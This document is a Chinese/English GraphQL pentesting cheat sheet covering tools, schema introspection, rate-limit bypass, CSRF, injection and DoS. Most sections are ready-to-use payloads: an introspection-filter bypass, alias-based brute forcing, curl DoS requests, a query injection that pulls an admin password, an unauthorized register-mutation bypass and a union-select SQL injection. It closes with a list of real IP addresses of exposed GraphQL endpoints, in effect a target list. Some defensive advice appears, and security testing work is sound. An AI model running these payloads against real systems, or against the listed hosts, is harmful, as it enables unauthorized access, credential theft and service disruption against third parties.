# GraphQL Hacking

### GraphQL security articles
```
https://xz.aliyun.com/t/13733
https://graphql.org/learn/security/
https://tari.moe/2022/graphql-dvga.html
https://www.acceis.fr/graphql-for-pentesters/
https://github.com/nicholasaleks/graphql-threat-matrix
https://escape.tech/blog/9-graphql-security-best-practices/
https://blog.cybervelia.com/p/graphql-exploitation-all-you-need-to-know
https://www.leavesongs.com/content/files/slides/%E6%94%BB%E5%87%BBGraphQL.pdf
https://www.vaadata.com/blog/graphql-api-vulnerabilities-common-attacks-and-security-tips/
https://portswigger.net/burp/documentation/enterprise/user-guide/api-documentation/graphql-api/graphql-common-tasks
https://github.com/Cyber-Guy1/API-SecurityEmpire/blob/main/assets/API%20Pentesting%20Mindmap%20%7B%7BGraphQL%20Attacking%7D%7D.pdf
```
---
### GraphQL hacking tools
```
=== 不同实现对GraphQL特性的支持
https://github.com/nicholasaleks/graphql-threat-matrix

=== Graphql端点 & 具体引擎识别：
https://github.com/dolevf/graphw00f
$ graphw00f -d -t http://target.com/
$ graphw00f -f -t http://target.com/graphql

=== 根据introspection生成引用关系图path
https://github.com/graphql-kit/graphql-voyager
https://graphql-kit.com/graphql-voyager/

=== 基于introspection结果来分析引用路径，用于对访问控制绕过分析
https://gitlab.com/dee-see/graphql-path-enum/

=== 漏洞扫描器：
https://github.com/dolevf/graphql-cop

=== 漏洞扫描器：
https://github.com/oslabs-beta/qevlar

=== 自动化测试：
https://github.com/sorokinpf/graphqler
Talk: https://clck.ru/KDZB3

=== 爆破密码：
https://github.com/nicholasaleks/CrackQL

=== schema枚举提取：
https://github.com/cybervelia/graphicator
https://www.freebuf.com/articles/network/362999.html

=== 子域名/目录枚举
https://github.com/Escape-Technologies/graphinder


=== 基于graphinder结果，检测是否启用了mutation，并检查可用的敏感查询，如果目标是Apollo Server，则运行Clairvoyance实现暴力破解
https://github.com/gsmith257-cyber/GraphCrawler

=== 枚举 GraphQL API schema 禁用introspection时
https://github.com/nikitastupin/clairvoyance

=== Fuzz和SQLi & NoSQLi:
https://github.com/swisskyrepo/GraphQLmap

=== Batch query attack:
https://github.com/assetnote/batchql
此工具能够检测以下内容：

- 自省查询支持
- 架构建议检测
- 潜在的 CSRF 检测
- 基于查询名称的批处理
- 基于查询 JSON 列表的批处理


https://github.com/forcesunseen/graphquail (Burp Extension, 根据错误提示推测schema info, 检测DoS)
参考：https://forcesunseen.com/blog/graphql-security-testing-without-a-schema

=== InQL - Burp插件， 解析introspection schema 生成查询
https://github.com/doyensec/inql

=== GraphQL Raider - burp 插件，自动化测试

=== InQL的命令行版本
https://github.com/doyensec/GQLSpection

=== DoS测试
https://github.com/oslabs-beta/janusQL

=== postman's graphql client
https://learning.postman.com/docs/sending-requests/graphql/graphql-client-interface/

=== GraphQL security testing tool
https://github.com/szski/shapeshifter  
```
---
### 基本概念
```
标量类型(Scalar Types):
对象类型(Object Types):
枚举类型(Enum Types):
输入类型(Input Types):
接口类型(Interface Types):
联合类型(Union Types):
列表类型(List Types):
非空类型(Non-Null Types):
修饰符:
! - 非空
[] - 列表
```

>Schema 定义了整个 API 的类型系统
```
schema {
  query: Query      # 查询入口
  mutation: Mutation  # 修改入口
}
```
>对象类型定义
```
type User {	# Type "User"
  id: ID!	# 这些都是 "field" 字段
  name: String
  age: Int
  posts: [Post]
}
```
>__typename 内置字段，返回类型名称
```
query {
  user {
    __typename     # 返回 "User"
    name
  }
}
```
>三种操作类型:
```
query {             # 查询数据
  user(id: "123") {
    name
  }
}

mutation {          # 修改数据
  createUser(name: "John") {
    id
  }
}

subscription {      # 订阅数据
  newUser {
    name
  }
}

```
---

### GraphQL 的操作类型
>必须为 schema 中的每个query和mutation明确指定授权以防止improper access control vulns

```
query: 用于查询、获取数据 
mutation: 用于修改、更新数据
subscription: 允许客户端通过WebSocket连接实时接收来自服务器的数据更新

graphql的query中， 要包含期望获取的数据字段，和sql查询类似

样例查询：

query GetScan {
  scans {
    id
    status
  }
}

GetScan 是这个查询的操作名称（Operation Name）。它类似于函数名，是为了方便识别和调试查询用的。这个名称是可选的，也可以省略
scans 是 GraphQL schema 中定义的一个字段或者说查询入口点（Query Field）。它可能返回一个扫描记录的列表。这个名称取决于后端 GraphQL 服务的 schema 定义。
后端可能这样定义：
type Query {
  scans: [Scan]   # 返回 Scan 类型的数组
}

type Scan {
  id: ID
  status: String
}

```

---

### Graphql Identification Query
```
要检查 URL 是否为 GraphQL 服务，可以发送通用查询:

query=query{__typename}
{"query":"query{__typename}"}
{"query":"mutation{__typename}"}

如果响应包含:

{"data": {"__typename": "Query"}}
{"data": {"__typename": "Mutation"}}

则确认 URL 托管 GraphQL 端点。

Others:

?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}


工具：
$ graphw00f -d -t http://noraj.test:5013
[*] Checking http://noraj.test:5013/
[*] Checking http://noraj.test:5013/graphql
[!] Found GraphQL at http://noraj.test:5013/graphql

$ graphw00f -f -t http://noraj.test:5013/graphql
识别具体引擎
```

---

### Introspection Query Attacks
>https://graphql.org/learn/introspection/ 

>Introspection 是查询当前 API schema 中哪些资源可用的能力
The server should response with the full schema (query, mutation, objects, fields…).

```
POST /graphql


query={__schema{...}} 格式或

####### PAYLOAD-1:
{"query": "{__schema{types{name,fields{name}}}}"}
{"query": "{__schema{types{name}}}"}
{"query": "{__schema{queryType{fields{name}}}}"}

通过此查询，将找到所有正在使用的类型的名称

####### PAYLOAD-2:
{"query": "{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}"}
通过此查询，可以提取所有类型、字段和参数（以及参数的类型）。 

####### PAYLOAD-3:
{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}



URL编码的：
query=query+IntrospectionQuery%7B__schema%7BqueryType%7Bname%7DmutationType%7Bname%7DsubscriptionType%7Bname%7Dtypes%7B...FullType%7Ddirectives%7Bname+description+locations+args%7B...InputValue%7D%7D%7D%7Dfragment+FullType+on+__Type%7Bkind+name+description+fields%28includeDeprecated%3Atrue%29%7Bname+description+args%7B...InputValue%7Dtype%7B...TypeRef%7DisDeprecated+deprecationReason%7DinputFields%7B...InputValue%7Dinterfaces%7B...TypeRef%7DenumValues%28includeDeprecated%3Atrue%29%7Bname+description+isDeprecated+deprecationReason%7DpossibleTypes%7B...TypeRef%7D%7Dfragment+InputValue+on+__InputValue%7Bname+description+type%7B...TypeRef%7DdefaultValue%7Dfragment+TypeRef+on+__Type%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name+ofType%7Bkind+name%7D%7D%7D%7D%7D%7D%7D%7D

列出 GraphQL中所有Query、Mutation、ObjectType、Field、Arguments

####### PAYLOAD-4:

send request on WebSocket


ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
  var GQL_CALL = {
    extensions: {},
    query: `
        {
            __schema {
                _types {
                    name
                }
            }
        }`,
  }

  var graphqlMsg = {
    type: "GQL.START",
    id: "1",
    payload: GQL_CALL,
  }
  ws.send(JSON.stringify(graphqlMsg))
}

####### Bypass Payload：

如果禁用 introspection 的方法错误，例如正则匹配schema{ 来识别，可以在后面加%0a换行符来绕过：

/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A

或尝试：
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D


POST /graphql
Content-Type: application/x-www-form-urlencoded
query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D


####### Disable Introspection正确方法：
1- ApolloServer：

const server = new ApolloServer({
  typeDefs,
  resolvers,
  introspection: process.env.NODE_ENV !== 'production'
});

2- 插件：
https://github.com/helfer/graphql-disable-introspection

app.use("/graphql", bodyParser.json(), graphqlExpress({
	schema: myGraphQLSchema,
	validationRules: [NoIntrospection]
}));

```
---

### Fuzz schema if Introspection disabled

- https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/
- https://webonyx.github.io/graphql-php/security/#disabling-introspection 

>默认情况 GraphQL后端有操作建议功能， 在query一个不存在的field时候会在响应中返回近似关键字的建议，从而泄露schema.

>Apollo 使用 NODE_ENV 环境变量禁用 introspection.

>Apollo不支持关闭建议，屏蔽方法：https://github.com/apollographql/apollo-server/issues/3919
```
参考文章：
https://escape.tech/blog/graphql-verbose-error-suggestions/
https://escape.tech/blog/graphql-security-wordlist/

Tools:
GraphQLmap: https://github.com/swisskyrepo/GraphQLmap
Graphquail: https://github.com/forcesunseen/graphquail

Graphql-visualizer: http://nathanrandal.com/graphql-visualizer/
Clairvoyance: https://github.com/nikitastupin/clairvoyance
Wordlist:    https://github.com/Escape-Technologies/graphql-wordlist  (collected 60k + open schemas)


寻找路径
graphql-path-enum列出了在 GraphQL 模式中达到给定类型的不同方式。它可以允许找到对象的间接路径以绕过限制。

$ graphql-path-enum -i /tmp/introspection-response.json -t OwnerObject

Found 3 ways to reach the "OwnerObject" node:
- Query (pastes) -> PasteObject (owner) -> OwnerObject
- Query (paste) -> PasteObject (owner) -> OwnerObject
- Query (readAndBurn) -> PasteObject (owner) -> OwnerObject
```
---
### GET/POST based CSRF
>https://blog.doyensec.com/2021/05/20/graphql-csrf.html
```
一个常见的误解是基于 JSON 的 API 不容易受到 CSRF 的攻击。
但事实上它的工作原理都是一样的。
创建一个经典的 CSRF 表单，并在使用 JavaScript 提交时将表单数据转换为 JSON
并用作application/json内容类型，因为它可能Content-Type是 GraphQL 引擎唯一接受的类型。
有时，由于中间件的原因，某些端点application/x-www-form-urlencoded也可能接受。

fetch()另一种选择是在 JavaScript 中准备完整的 JSON 查询并使用或自动提交XHR。

##### 也可以尝试使用GET请求看是否支持：
GET /graphql?query=query+%7B+a+%7D

##### 也可以修改Content-Type
POST /graphql
Content-Type: application/x-www-form-urlencoded

query=query+%7B+a+%7D


如果返回：
{"errors":[{"message":"Cannot query field \"a\" on type \"Query\".","locations":[{"line":1,"column":9}]}]}
可能存在问题，可以继续深入分析并查找敏感mutation 操作以测试CSRF
```

---
### GraphQL Batching Attack
>GraphQL 独有的一个能力，一个request包含多个query，

>这种特性可以使攻击者在进行暴力破解时，将多个queries放在同一个request中从而绕过外部速率限制

>例如爆破密码、2FA的OTP 等场景

```
###### 基于JSON列表的：

[
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   },
   {
      "query":"query { assetnote: Query { hacktheplanet } }"
   }
]
###### 基于查询名称（aliases）的：

{"query": "query { assetnote: Query { hacktheplanet } assetnote1: Query { hacktheplanet } }"}



REFERENCE:
https://lab.wallarm.com/graphql-batching-attack/
https://www.assetnote.io/resources/research/exploiting-graphql

工具：https://github.com/assetnote/batchql
此工具能够检测以下内容：

- 自省查询支持
- 架构建议检测
- 潜在的 CSRF 检测
- 基于查询名称的批处理
- 基于查询 JSON 列表的批处理


防御Batching Attack：
- 在代码中添加对象请求速率限制
- 防止敏感对象批处理
- 限制一次可以运行的查询数量
```

---

### BruteForcing via GraphQL aliases
```
query isValidDiscount($code: Int) {
    isvalidDiscount(code:$code){
        valid
    }
    isValidDiscount2:isValidDiscount(code:$code){
        valid
    }
    isValidDiscount3:isValidDiscount(code:$code){
        valid
    }
}


Reference:
https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html#bypassing-rate-limits-using-aliases-in-graphql
https://portswigger.net/web-security/graphql/what-is-graphql#aliases
```

---

### DoS attack by GraphQL aliases overloading (multiple aliases)
```
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
    -d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
    'https://example.com/graphql'

```
---

### DoS attack by array based query batching (multiple Queries in one request)
```
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'

```
---

### DoS attack by directive overloading vuln

```
PAYLOAD-1:

# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'



PAYLOAD-2:
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'

也可发送 introspection query 发现所有 声明的指令  （declared directives）:

curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'


```
---

### DoS attack by field duplication vuln
```
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
-d '{"query": "query cop { __typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'

```
---
### DoS attack by Circular fragments attack
```
The Spread 操作符 (...) 允许反复利用 fragments. 
两个fragments互相调用形成死循环，例如：

fragment noraj on PasteObject {
  title
  content
  ...jaron
}
fragment jaron on PasteObject {
  content
  title
  ...noraj
}
query {
  ...noraj
}
```
---
### 多层嵌套Query & 多数量Query DoS
>Deep recursion query attack
```
例如：
query evil {            # Depth: 0
  album(id: 42) {       # Depth: 1
    songs {             # Depth: 2
      album {           # Depth: 3
        ...             # Depth: ...
        album {id: N}   # Depth: N
      }
    }
  }
}

query {
  author(id: "abc") {
    posts(first: 99999999) {
      title
    }
  }
}

解决方案：
限制深度、数量、超时、复杂度分析
https://www.npmjs.com/package/graphql-depth-limit
https://github.com/joonhocho/graphql-input-number
https://medium.com/workflowgen/graphql-query-timeout-and-complexity-management-fab4d7315d8d
https://github.com/4Catalyzer/graphql-validation-complexity
https://github.com/pa-bru/graphql-cost-analysis
```

---
### IDOR / Injection Attacks
```
{
  "operationName":"updateProfile",
  "variables":{"username":INJECT,"data":INJECT},
  "query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}

```
---
### GraphQL Injection Vuln
```
用户访问恶意URL -> 前端获取恶意参数 -> 拼接成恶意GraphQL语句 -> 发送 -> 后端执行

##### 原始Query：
mutation {
  editProfile(name: "guest", age: 5) {
    id
    name
    age
    password
  }
}
##### 注入后：
mutation {
  editProfile(name: "guest", age: 5) {
    id
    password
  }
  changePassword(password: "123456"){
    id
    name
    age
    password
  }
}
##### 防御：参数化查询：
mutation($name: String!, $age: Int!)
{
  editProfile(name: $name, age: $age)
  {
    id
    name
    age
    password
  }
}

{"name": "guest", "age": 5}

```
<img width="406" alt="image" src="https://github.com/user-attachments/assets/91a2cd3f-dbc7-482a-b1a3-5033a449dcf9" />

### GraphQL注入例子：
```
=== 定义
    const id = props.match.params.id;
    const queryUser = gql`{
        user(_id: ${id}) {
            _id
            username
            email
        }
    }`

=== 注入Payload
${id}的值会在发出GraphQL查询请求前就被拼接进完整的GraphQL语句中。攻击者对${id}注入恶意语句：

-1)%7B_id%7Dhack%3Auser(username%3A"admin")%7Bpassword%23
URL解码：
-1){_id}hack:user(username:"admin"){password#

=== 变成了：
{
    user(_id: -1) {
        _id
    }
    hack: user(username: "admin") {
        password #) {
        _id
        username
        email
    }
}

##### 防御：参数化
=== QUERY定义：

type Query {
    user(
        username: String!
    ): User
}

=== 请求时，传入变量

query GetUser($name: String!) {
    user(username: $name) {
        _id
        username
        email
    }
}
// 变量传入
{"name": "some username"}

```
---

### Graphql-Query-Authentication-Bypass 

```
例如原始查询是通过email获取忘记密码的修改密码link：
{
	"operationName":"forgotPassword",
	"variables":{
		"email":"xxxx@gmail.com"
	},
	"query":
	"mutation forgotPassword($email: $email: String!){
		forgotPassword(email: $email){
 			ok
		}
   	}"
}

可以把本来没有权限的注册的query插入进去，从而得以执行，注册一个账号：

{
	"operationName":"forgotPassword",
	"variables":{
		"email":"xxxx@gmail.com"
		"test":
		{
			"username":"testing",
			"email":"ooo@gmail.com",
			"password":"123456"
		}
	},
	"query":
	"mutation forgotPassword($email: $email: String!, $test: UsersPermissions RegisterInput!){
 		forgotPassword(email: $email){
   			ok
 		}
   		register(input: $test){user{id},jwt}
	}"
}


Reference:
https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln
```

---
### GraphQL based SQL injection
```
POST /graphql HTTP/1.1
Host: test.local
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5


{"variables":{
"pid":"0 union select 1,2,sql FROM sqlite_master limit 1,2"
},
"query":"query partition($pid:ID!) {\n  partition(id: $pid) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
```
---

### Multipath Evaluation, 用于绕过访问控制 

<img width="877" alt="image" src="https://github.com/user-attachments/assets/e3242ab3-66df-4570-9383-7e149360f07c" />

---
### GraphiQL - 浏览器IDE
```
GraphiQL 的默认配置通常是：
端口：4000
路径：/graphiql 或 /graphql
不过这个配置可能因为不同的框架或设置而变化。比如：

Express + GraphiQL: 通常是 http://localhost:4000/graphiql
Apollo Server: 通常是 http://localhost:4000/graphql
Spring Boot GraphQL: 通常是 http://localhost:8080/graphiql
```
---

### GraphQL 测试主要关注点
```
Schema Introspection: Retrieve and examine the GraphQL schema, to grasp structure, types, queries, and mutations.

Sensitive Data Analysis: Looking for all sensitive fields that it might handle.

Query Complexity Testing: We want to make sure that the query complexity of our server is within certain limits and that its depth does not reach too deep so as to prevent potential resource exhausting attacks.

Authorization Checks: Try to access restricted data or carry out unauthorized operations to find out if there are any high-level authorization bypasses.

Input Validation Testing: Test input validation by sending crafted payloads that have been hand-crafted to fit the bill.

Error Message Analysis: Analyze error responses from Web Services in order to find out what kind of information leaks about the underlying infrastructure there may be.

Subscription Testing: If subscriptions are allowed, test for potential data leakage or unauthorized access while Real-Time data transmission is in use.
```

### 一些GraphQL vuln reports
```
Introspection --> register user --> grant admin right
https://hackerone.com/reports/2233480

WordPress的 GraphQL 插件漏洞，（允许Introspection查询泄露能力，并且没有做mutation的访问控制）
导致允许攻击者创建管理员用户，伪造身份进行评论等越权操作
https://www.pentestpartners.com/security-blog/pwning-wordpress-graphql/

Facebook Marketplace 的GraphQL 敏感信息泄露漏洞，可以获得发布商品的卖家的精确经纬度和邮编等具体位置信息
https://vulners.com/myhack58/MYHACK58:62201994269

Shopify 2023年在 HackerOne 上发现了至少 12 个与 GraphQL 相关的漏洞，风险等级从高到中不等
（参阅https://hackerone.com/reports/419883）收集大量子域名，发送introspection查询，然后发现泄露信息的端点

HackerOne本身由于 GraphQL 而多次受到攻击
（包括 SQL 注入https://vulners.com/hackerone/H1:435066）

NewRelic的IDOR
（https://www.jonbottarini.com/2018/01/02/abusing-internal-api-to-achieve-idor-in-new-relic/）

HackerOne信息泄露
https://hackerone.com/reports/310946
https://hackerone.com/reports/342978
https://hackerone.com/reports/182358
https://hackerone.com/reports/188719
https://hackerone.com/reports/186230

https://www.hackerone.com/ethical-hacker/30000-gem-part-1

```
---

### Online Graphql endpoint
```
GraphiQL Editor

http://52.56.70.57:4000/
http://147.28.148.225:4000/
http://5.161.229.234:4000/
http://3.18.83.48:4000/
http://138.197.166.42:4000/
https://52.74.207.183:4000/
http://18.182.26.100:4000/
http://3.138.161.132:4000/
http://81.173.83.141:4000/
http://185.46.57.234:4000/
http://88.99.32.223:4000/
http://18.157.206.110:4000/
http://87.246.54.84:4000/
http://194.99.21.126:4000/
http://212.159.69.40:4000/
http://189.90.46.174:4000/
http://50.114.62.45:4000/

GraphQL endpoints (支持introspection)
http://3.138.161.132:4000/graphql
http://3.18.83.48:4000/graphql
http://52.56.70.57:4000/graphql
http://138.197.166.42:4000/graphql

```
